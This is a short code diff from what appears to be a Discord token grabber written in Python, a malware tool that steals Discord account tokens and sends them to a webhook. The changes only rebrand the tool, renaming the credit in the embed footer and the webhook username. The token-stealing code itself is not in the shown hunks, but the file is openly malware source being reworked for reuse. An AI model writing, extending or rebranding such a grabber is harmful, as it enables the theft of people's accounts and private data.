@@ -164,7 +164,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token Grabber By Astraa",
+                    "text": f"Token Grabber By BlueCast",
                 }
             }
             embeds.append(embed)
@@ -177,7 +177,7 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Discord Token Grabber",
+        "username": "Super Token Grabber",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
